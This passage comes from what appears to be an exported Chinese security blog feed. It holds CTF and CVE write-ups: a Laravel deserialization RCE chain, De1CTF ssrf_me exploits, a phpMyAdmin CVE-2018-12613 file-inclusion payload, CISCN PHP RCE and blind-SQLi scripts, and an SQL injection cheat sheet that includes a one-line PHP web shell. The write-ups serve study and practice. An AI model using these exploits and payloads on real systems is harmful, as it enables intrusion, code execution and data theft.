$this-&gt;instances[$abstract]; &#125; $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); if ($this-&gt;isBuildable($concrete, $abstract)) &#123; $object = $this-&gt;build($concrete); &#125; else &#123; $object = $this-&gt;make($concrete); &#125; foreach ($this-&gt;getExtenders($abstract) as $extender) &#123; $object = $extender($object, $this); &#125; if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123; $this-&gt;instances[$abstract] = $object; &#125; $this-&gt;fireResolvingCallbacks($abstract, $object); $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object;&#125; instances 是 Container.php 中 Container 类的属性。因此我们只需要找到一个继承自 Container 的类，就可以通过反序列化控制 $this-&gt;instances 属性。Illuminate\Foundation\Application 继承自 Container 类。$abstract 为Illuminate\Contracts\Console\Kernel ，只需通过反序列化定义 Illuminate\Foundation\Application 的 $instances 属性存在键名为 Illuminate\Contracts\Console\Kernel 的数组就能返回我们要实例化的类名。在这里返回的是 Illuminate\Foundation\Application 类。 其余的就和第一种相同了，不同点在于构造可控实例化对象的方法不同 exp : 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// gadgets.phpnamespace Illuminate\Foundation\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app) &#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\Foundation&#123; class Application&#123; protected $instances = []; public function __construct($instance)&#123; $this-&gt;instances["Illuminate\Contracts\Console\Kernel"] = $instance; &#125; &#125;&#125;?&gt; 123456789&lt;?php// chain.php$defaultgenerator = new Faker\DefaultGenerator(array("expectedOutput"=&gt;array("0"=&gt;"1"),"expectedQuestions"=&gt;array("0"=&gt;"1")));$app = new Illuminate\Foundation\Application();$application = new Illuminate\Foundation\Application($app);$pendingcommand = new Illuminate\Foundation\Testing\PendingCommand('system', array('id'), $defaultgenerator, $application);echo urlencode(serialize($pendingcommand));?&gt; 思考 代码调试的技巧 函数调用栈的分析 可控点的寻找 参考链接 https://xz.aliyun.com/t/5483 https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/ https://www.jianshu.com/p/438a95046403]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>Laravel</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[De1CTF web ssrf_me 的三种方法]]></title>
    <url>%2F2019%2F08%2F10%2FDe1CTF%20web%20ssrf_me%20%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[原帖地址 : https://xz.aliyun.com/t/5927 De1CTF 2019 的一个题目总结 题目描述 直接查看页面源代码可以看到正确格式的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if "scan" in self.action: tmpfile = open("./%s/result.txt" % self.sandbox, 'w') resp = scan(self.param) if (resp == "Connection Timeout"): result['data'] = resp else: print(resp) tmpfile.write(resp) tmpfile.close() result['code'] = 200 if "read" in self.action: f = open("./%s/result.txt" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = "Action Error" else: result['code'] = 500 result['msg'] = "Sign Error" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route("/geneSign", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get("action")) param = urllib.unquote(request.args.get("param", "")) sign = urllib.unquote(request.cookies.get("sign")) ip = request.remote_addr if(waf(param)): return "No Hacker!!!!" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open("code.txt","r").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return "Connection Timeout"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith("gopher") or check.startswith("file"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 提示给的是 flag 在 ./flag.txt 中，题目单词打错了 python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战 大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action) 哈希拓展攻击 这是这道题最多的解法，介绍 : https://joychou.org/web/hash-length-extension-attack.html secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取 md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;) 的值，为 8370bdba94bd5aaf7427b84b3f52d7cb，而目标则是获取 md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;) 的值 使用 hashpump 即可 1234567root@peri0d:~/HashPump# hashpumpInput Signature: 8370bdba94bd5aaf7427b84b3f52d7cbInput Data: scanInput Key Length: 24Input Data to Add: readd7163f39ab78a698b3514fd465e4018ascan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read exp : 1234567891011import requestsurl = 'http://139.180.128.86/De1ta?param=flag.txt'cookies = &#123; 'sign': 'd7163f39ab78a698b3514fd465e4018a', 'action': 'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read', &#125;res = requests.get(url=url, cookies=cookies)print(res.text) 字符串拼接 试着访问了一下 /geneSign?param=flag.txt ，给出了一个 md5 8370bdba94bd5aaf7427b84b3f52d7cb ，但是只有 scan 的功能，想加入 read 功能就要另想办法了 1234def geneSign(): param = urllib.unquote(request.args.get("param", "")) action = "scan" return getSign(action, param) 看了一下逻辑，在 getSign 处很有意思，这个字符串拼接的就很有意思了 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。 直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;) ，等价于 md5(&#39;xxxflag.txtreadscan&#39;) ，这就达到了目标。 直接访问 /De1ta?param=flag.txt 构造 cookie action=readscan;sign=7cde191de87fe3ddac26e19acae1525e 即可 local_file 天枢大佬们的做法 : https://xz.aliyun.com/t/5921#toc-16 放上他们的 exp : 12345678910111213141516171819202122232425262728293031import requestsconn = requests.Session()url = "http://139.180.128.86"def geneSign(param): data = &#123; "param": param &#125; resp = conn.get(url+"/geneSign",params=data).text print resp return respdef challenge(action,param,sign): cookie=&#123; "action":action, "sign":sign &#125; params=&#123; "param":param &#125; resp = conn.get(url+"/De1ta",params=params,cookies=cookie) return resp.textfilename = "local_file:///app/flag.txt"a = []for i in range(1): sign = geneSign("&#123;&#125;read".format(filename.format(i))) resp = challenge("readscan",filename.format(i),sign) if("title" in resp): a.append(i) print resp,iprint a 请求 /geneSign?param=local_file:///app/flag.txtread 获取 md5 值为 60ff07b83381a35d13caaf2daf583c94 ，即 md5(secert_key + &#39;local_file:///app/flag.txtread&#39; + &#39;scan&#39;) 然后再请求 /De1ta?param=local_file:///app/flag.txt 构造 cookie action=readscan;sign=60ff07b83381a35d13caaf2daf583c94 以上就是他们 exp 做的事情，和上一个方法差不多 关于 local_file : https://bugs.python.org/issue35907 这里是使用的 urllib.urlopen(param) 去包含的文件，所以可以直接加上文件路径 flag.txt 或 ./flag.txt 去访问，也可以使用类似的 file:///app/flag.txt 去访问，但是 file 关键字在黑名单里，可以使用 local_file 代替 如果使用 urllib2.urlopen(param) 去包含文件就必须加上 file ，否则会报 ValueError: unknown url type: /path/to/file 的错误]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>De1CTF</tag>
        <tag>ssrf_me</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-12613 的一些思考]]></title>
    <url>%2F2019%2F06%2F28%2FCVE-2018-12613%20%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现 CVE-2018-12613 的一些思考，关于文件包含路径的问题 漏洞/index.php 第 55 行 12345678910111213$target_blacklist = array ( 'import.php', 'export.php');if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target'])) &#123; include $_REQUEST['target']; exit;&#125; 传入参数 target 需要满足 不以 index.php 开头 不在 target_blacklist 中 通过 checkPageValidity() 函数检验 checkPageValidity() 函数 12345678910111213141516171819202122232425262728293031323334public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; 第一个返回 True 的地方，直接将 page 与 whitelist 比较，传入的必须是白名单里的文件名，无法绕过 123if (in_array($page, $whitelist)) &#123; return true;&#125; 第二个返回 True 的地方，mb_strpos($x, $y) 函数查找 $y 在 $x 中首次出现的位置。mb_substr($str, $start, $length) 函数从 $str 中，截取从 $start 位置开始，长度为 $length 的字符串。 但是在这里如果直接构造 payload : ?target=db_sql.php?/../../../cookie.txt 并不能跨路径包含，? 后面的字符串会被当做传入 db_sql.php 的参数，这就要利用后面的 urldecode 了 12345678$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') );if (in_array($_page, $whitelist)) &#123; return true;&#125; 第三个返回 True 的地方，可以利用双重编码绕过，将 ? 经过两次编码 %253f 就可以绕过白名单验证。%253f 传入时，首先会被自动解码一次，变成 %3f，然后urldecode() 再解码一次，就变成了 ? 此时的 payload : ?target=db_sql.php%253f/../../../cookie.txt 123456789$_page = urldecode($page);$_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') );if (in_array($_page, $whitelist)) &#123; return true; &#125; 问题 include &#39;db_sql.php%253f/../../../cookie.txt&#39; 为什么只会包含 cookie.txt 而不会包含 db_sql.php 传入 db_sql.php%253f/../../../cookie.txt 为什么会在 in_array($_page, $whitelist) 处返回 True 如图，z.php 中 include 两个 ../ 可以包含，y.php 中一个 include 也可以包含 在 php 的 include 中，include &#39;hint.php?/../cookie.txt&#39;; 会报错，include &#39;hint.php%3f/../cookie.txt&#39;; 不会报错，且可以成功包含 一些解释在 include 中，举个例子，假设 x.php 代码包含 include &#39;1source.phps/../cookie.txt&#39;; ，假设 1source.phps 不存在，那么这个文件包含等同于 : 在 1source.phps 文件夹目录下的上一级中的 cookie.txt ，也就是和 x.php 在同一目录下的 cookie.txt ，如果 1source.phps 存在，并且它是一个文件，那么肯定会报错，如果它是一个文件夹，也会成功包含 cookie.txt 。如果变为 include &#39;1source.phps/./cookie.txt&#39;; ，道理和上面相同 重新思考 代码如下 : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; 传入 file=hint.php ，在第一个 in_array 处会返回 true，然后直接包含 hint.php 传入 file=hint.php?/../cookie.txt ，在第二个 in_array 处会返回 true，第二个 in_array 中的 _page 为 hint.php ，然后包含 hint.php?/../cookie.txt ，但是这里的 ? 起到传递参数的作用而不是破坏路径 传入 file=hint.php%253f/../cookie.txt ，在第三个 in_array 处会返回 true ，第三个 in_array 中的 _page 为 hint.php ，然后包含 hint.php%3f/../cookie.txt ，这里的 %3f 即 ? ，破坏了路径，前面部分的路径不存在，可以包含后面的文件]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CVE</tag>
        <tag>文件包含的路径</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019CISCN华南线下两道web复现]]></title>
    <url>%2F2019%2F06%2F25%2F2019CISCN%E5%8D%8E%E5%8D%97%E7%BA%BF%E4%B8%8B%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[原帖地址 : https://xz.aliyun.com/t/5558 2019CISCN华南线下的两个简单 web 部分题目下载地址，有的不完整 : 点我点我 web 1 考点 : 无参函数的 RCE 在注释中发现了 forgetpassword.php 页面 打开 forgetpassword.php，要求输入一个用户名，尝试用户名爆破，结果为 admin123 12345678910111213141516171819202122import requestsurl = "http://127.0.0.1/ciscn/web1/useri.php"response = "没有这个用户"f = open("./username.txt", "r", encoding="utf-8")for line in f: line = line.strip() data = &#123; "user_name" : line, &#125; r = requests.post(url=url, data=data) if response in r.text: continue else: print(line) break 输入 admin123 之后跳转到 useryzm.php 页面 提示验证码经过 base64 加密，而且验证码是 4 位的数字，写脚本爆破一下，结果验证码为 MTQyMw== 四位数字生成 123456for i in range(0,10000): s = str(i).zfill(4) print(s) f = open("num.txt",'a') f.write(s) f.write('\n') #实现换行的功能 爆破密码 123456789101112131415161718192021222324import requestsimport base64url = 'http://127.0.0.1/ciscn/web1/yzmi.php'f = open('./num.txt', 'r', encoding="utf-8")response = "错误"for line in f: line = line.strip().encode('utf-8') line = base64.b64encode(line) data = &#123; "yzm" : line.decode('utf-8'), &#125; r = requests.post(url=url, data=data) if response in r.text: continue else: print(line) break 输入后获得密码 f4h1l0t0j2g5b1m0a0m0a3d2d0 返回 index.html 输入账号密码，获得新提示，但是这里忘记复制数据库了，就直接跳到下一步吧，访问 mDjNaF.php mDjNaF.php 页面 看一下正则，preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])，\W 匹配任意字母和数字，(?R)? 重复整个模式，合在一起类似于匹配 x(y(z())) 样式的，且不能存在参数，输入 phpinfo(); 可以查看 phpinfo 页面 接下来就是构造无参数函数进行 RCE 了，想到可以更改 header 中的属性和值，使用无参数函数获取 header 处的值，达到 RCE 的目的。 对于 Cookie 属性，我们可以随意更改，session_id() 函数可以获取 PHPSESSID，如果没有开启 session 可以使用 session_start() 函数。由于不能带参数，我们可以将命令转化为 hex 再用 hex2bin() 函数转化。 payload : 123?code=eval(hex2bin(session_id(session_start())));// echo 'peri0d';Cookie: PHPSESSID=6563686f2027706572693064273b 还可以自己传参达到 RCE，get_defined_vars() 函数返回所有已定义的变量列表，然后利用提取位置的函数就可以实现 RCE payload : ?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir(&#39;../&#39;)) web 4 考点 : insert() 盲注 一个登录页面 试一试万能密码 admin&#39;# ，登录成功，并给出提示 经过 fuzz 发现过滤了空格，union，benchmark，sleep，regexp，order等很多很多关键字，空格可以使用 /**/ 绕过 给出了文件路径，可以使用 load_file 读取，再与 insert() 函数结合，使用异或，好像可以进行盲注 insert((select(load_file(&#39;/flag&#39;))),2,255,&#39;&#39;) 即在 flag 中，从第 2 个字符到第 255 个字符替换为空字符，即只显示第 1 个字符。insert((select(load_file(&#39;/flag&#39;))),3,255,&#39;&#39;)把第 3 个字符到第 255 个字符替换为空字符，即只显示前面两个字符。 脚本如下 1234567891011121314151617181920212223242526import requestsurl = 'http://172.27.137.145/ciscn/web4/index.php'# payload = "admin'^(select('f')&gt;(insert((select(load_file('/flag'))),2,255,'')))#"temp_list = []flag_list = []for i in range(2,255): payload_1 = "')&gt;(insert((select(load_file('/flag'))),"+str(i)+",255,'')))#" flag = ''.join(flag_list) temp_list.clear() for j in range(32, 127): payload = "admin'^(select('"+flag+chr(j)+payload_1 print(payload) data = &#123;'username' : payload,&#125; r = requests.post(url=url, data=data) if 'success' in r.text: temp_list.append(chr(j)) try: flag_list.append(temp_list.pop()) except: breakprint(''.join(flag_list)) 过滤语句 : 12345678if(preg_match("/union|benchmark|strcmp|locate|STRCMP|position|md5|mid|sub|concat|and|left|sleep|space|instr|conv|\s|right|cast|locate|limit|reverse|glob|having|match|count|pad|char|hex|regexp|order|group|ascii|information/i",$username))&#123; die('wafed!&lt;br&gt;');&#125;if(preg_match("/union|position|strcmp|locate|benchmark|STRCMP|concat|md5|mid|sub|sleep|and|left|cast|space|instr|pad|conv|\s|right|limit|reverse|locate|match|glob|having|count|char|hex|regexp|order|group|ascii|information/i",$passwd))&#123; die('wafed!&lt;br&gt;');&#125;]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL 注入]]></title>
    <url>%2F2019%2F06%2F10%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[自己做的注入总结，包含了常见的问题，会随着比赛的扩充而扩充 一些问题sqli-labs 和 dvwa在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1 由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况 同样的在 Less-25 中，过滤了 and 和 or ，如果直接使用 &amp;&amp; ，是会报错的，应用 %26%26 在 dvwa 的注入中，在提交 id 时会对提交内容进行一次 URLencode，所以在那个框框里面输入 1’ %23 是无法起到注释作用的，通过抓包发现其请求的是 ?id=1’%2523，其中 %25 是 % 的URL编码。在sqli-labs的 POST 注入中也会出现上述情况。 一些闭合方式‘$id’，”$id”，(‘$id’)，(“$id”)，{“$id”}，{‘$id’} GET型注入判断类型字符型 12345?id=1&apos; //报错信息 &apos;1&apos;&apos; LIMIT 0,1 //有三个 &apos; ，猜 MySQL 语句 select * from table where id=&apos;$id&apos; near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 ?id=1&apos;%23 //返回正常 数字型 12345?id=1&apos; //报错信息 &apos; LIMIT 0,1 //有一个 &apos; ，猜 MySQL 语句 select * from table where id=$id near &apos;&apos; LIMIT 0,1&apos; at line 1 ?id=1+1 //返回正常 判断查询字段数123?id=1&apos; union slect 1,2,3 %23 ?id=1&apos; order by 3 %23 //返回正确，说明MySQL为select column1,column2,column3 from table where id=&apos;$id&apos; 数据库1234//当前数据库 ?id=1&apos; uinon select databse(),2,3 %23 //所有数据库 ?id=1&apos; union select 1,select schema_name from INFORMATION_SCHEMA.schemata,3 %23 数据表1?id=1&apos; union select 1,select table_name from information_schema.tables where table_schema=&apos;xxx&apos;,3 %23 数据列1?id=1&apos; union select 1,select column_name from information_schema.columns where table_name=&apos;xxx&apos;,3 %23 数据内容1?id=1&apos; union select 1,select xxx from xxx,3 %23 布尔盲注一般布尔盲注中只会出现返回成功和返回失败的界面，不会有union联合查询的。 盲注分为布尔型，时间型和报错型。 首先判断注入类型，和以前相同，要注意二分法的应用。 数据库名称长度12//用二分法判断范围 ?id=1&apos; and length(database())=8 %23 //返回正确，说明数据库名称长度为8 数据库名称内容left判断 1?id=1&apos; and left(database(),1)=&apos;s&apos; %23 ?id=1&apos; and left(database(),2)=&apos;se&apos; %23 ?id=1&apos; and left(database(),8)=&apos;security&apos; %23 substr判断 1?id=1&apos; and ascii(substr(database(),1,1))=83 %23 ?id=1&apos; and ascii(substr(database(),2,1))=69 %23 ?id=1&apos; and substr(database(),1,8)=&apos;security&apos; %23 regexp判断 1?id=1&apos; and 1=(database() regexp &apos;^[a-z]&apos;) %23 ?id=1&apos; and 1=(database() regexp &apos;^s[a-z]&apos;) %23 ?id=1&apos; and 1=(database()=&apos;security&apos;) %23 mid判断 1?id=1&apos; and ord(mid(database(),1,1))=83 %23 ?id=1&apos; and ord(mid(database(),2,1))=69 %23 ?id=1&apos; and mid(database(),1,8)=&apos;security&apos; %23 数据表先用length()判断长度 1?id=1&apos; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=5 %23 然后判断内容 12345678//left判断前两位 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos; %23 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&apos;em&apos; %23 //substr判断第三位 ?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)=&apos;a&apos; %23 //regexp判断第四位 ?id=1&apos; and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regexp &apos;^emai[a-z]&apos; limit 0,1) %23 //mid判断第五位 ?id=1&apos; and mid((seanlect table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)=&apos;l&apos; %23 如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可 但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到 数据列1select table_name from information_schema.tables where table_schema=database() limit 0,1 改为 1select column_name from information_schema.columns where table_name=&apos;xxxx&apos; limit 0,1 再进行判断 数据内容1234//ifnull和cast函数，第一位为D ?id=1&apos; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 %23 //普通方式，第二位为u ?id=1&apos; and ascii(substr((select username from security.users order by id limit 0,1),2,1))=85 %23 报错注入使用报错注入的前提是，当前页面能够 print_r(mysql_error()) 或者是 echo(mysql_error()) 后面 from 的表必须是存在的，比如 information_schema.tables 或者 information_schema.columns Floor报错这两种语句都可以，只是第一个知道字段数是3 1234//替换 select user() ?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23 //替换 select schema_name frominformation_schema.schemata limit 0,1 ?id=1&apos; and (select 1 from (select count(*),concat(((select schema_name frominformation_schema.schemata limit 0,1)),&apos;;&apos;,floor (rand(0)*2))x frominformation_schema.tables group by x)a) %23 简化版Floor报错注入 1select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果关键的表被禁用了，可以使用这种形式 1select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2)) 如果 rand 被禁用了可以使用用户变量来报错(实测未成功) 1select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2) Xpath报错这个很常用 1234//extractvalue ?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) %23 //updatexml ?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) %23 延时注入sleep()1?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(10)) %23 benchmark()1?id=1&apos; union select (if(ascii(substr(current,1,1))=113,benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select database() as current) as tb1 %23 导入导出首先判断当前用户是否具有写入权限 1?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 //返回正确，说明有最高权限 将 select 内容导入文件，这里的 path 必须要是绝对路径 123select version() into outfile &quot;path&quot; //version()也可以换成一句话 select &lt;?php @eval($_post[&quot;a&quot;])?&gt; into outfile &quot;path&quot; 这里是可以直接 getshell 的 POST注入和 GET 注入类似，只是传输的数据不在 URL 中显示，有时需要抓包。常见于登陆的页面 最常见的一个，万能密码 1select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1 提交 username=admin’ # password=1(任意密码) 即可登陆 有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里注入(报错注入，布尔盲注，时间盲注，联合查询) 增删改常见于注册(insert)和修改内容(update)的页面，有时需要抓包 比如修改密码 1update users set password=&apos;$password&apos; where username=&apos;$username&apos; 在 password 或者 username 处注入，最常见的用报错注入。有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里报错注入 这里也会造成二次注入，蓝鲸的一个题目 HEADER头注入抓包修改 header 头部，比如 user-agent，referer，cookie sqli-labs Less-18 12//Less-19的 referer 同理，也可以用 floor，updatexml 1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1 我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent Less-20修改cookie 1uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) # 宽字节注入这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数 两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效 绕过方法： 12345//GET型 ?id=-1%df%27 union select 1 %23 //POST型，以万能密码为例，&apos; 转为 utf-16 或者 utf-32 //此处 �&apos; 的 urlencode 为 %ef%bf%bd%27 name=�&apos; or 1=1 # &amp;pass=111 堆叠注入在 SQL 中，用分号( ; )来表示语句的结尾，如果再 ; 结束一个 SQL 语句之后继续构造下一条语句，是会在一起执行的。对比于 union 的查询语句，堆叠注入可以执行任意语句 例如 : 强网杯-随便注 insert() 盲注insert(str,pos,len,newstr) : 对字符串 str，从 pos 位置开始，长为 len 个字符的字符串用 newstr 替换 第一个，对于字符串 123456，从第 1 个位置开始，截取长度为 2 的字符串，即 12 用 xx 替换 第二个，对于字符串 123456，从第 2 个位置开始，截取长度为 2 的字符串，即 23 用 xx 替换 当 len 超过 str 的长度时 盲注细节如下 : ciscn 华南线下 web4 各种绕过过滤 # 和 –+1、union 联合查询，控制查询结果显示位置 1?id=-1&apos; union select 1,user(),&apos;3 2、利用 or ‘1’=’1 闭合 1?id=1 or extractvalue(1,concat(0x7e,(select user()),0x7e)) or &apos;1&apos;=&apos;1 3、编码绕过 1234567891011121314//url encode # = %23 //hex # = %23 --+ = %2D%2D%2B //unicode # = \u0023 --+ = \u002d\u002d\u002b //html encode --+ = &amp;#45;&amp;#45;&amp;#43; # = &amp;#35 过滤 and 和 or1、编码 1234567891011121314//大小写 Or OR oR AND //hex and = %61%6E%64 or = %6F%72 //unicode and = \u0061\u006e\u0064 or = \u006f\u0072 //html encode and = &amp;#97;&amp;#110;&amp;#100; or = &amp;#111;&amp;#114; 2、替换 123and = &amp;&amp; or = || //在 URL 栏中 &amp;&amp; 要换 %26%26 过滤空格1、特殊字符 123%a0 新建一行 %0b TAB垂直 /**/ 注释 2、编码 12345//unicode \u0020 //html encode&amp;#32; 过滤 union 和 select 等1、编码 1234567891011121314//大小写 UniON SelEcT //hex union = %75%6E%69%6F%6E select = %73%65%6C%65%63%74 //unicode union = \u0075\u006e\u0069\u006f\u006e select = \u0073\u0065\u006c\u0065\u0063\u0074 //html encode union = &amp;#32;&amp;#117;&amp;#110;&amp;#105;&amp;#111;&amp;#110;select = &amp;#115;&amp;#101;&amp;#108;&amp;#101;&amp;#99;&amp;#116; 2、重复(只过滤一次时) 12ununionionselselectect 3、注释 12/*!union*/ /*!select*/ 过滤 ‘ 和 \1、宽字节注入 2、编码 123456789101112131415//url encode &apos; = %27 \ = %5c //hex &apos; = %27 \ = %5c //unicode &apos; = \u0027 \ = \u005c //html encode &apos; = &amp;#39;\ = &amp;#92;]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯web复现]]></title>
    <url>%2F2019%2F06%2F05%2F2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0%2F</url>
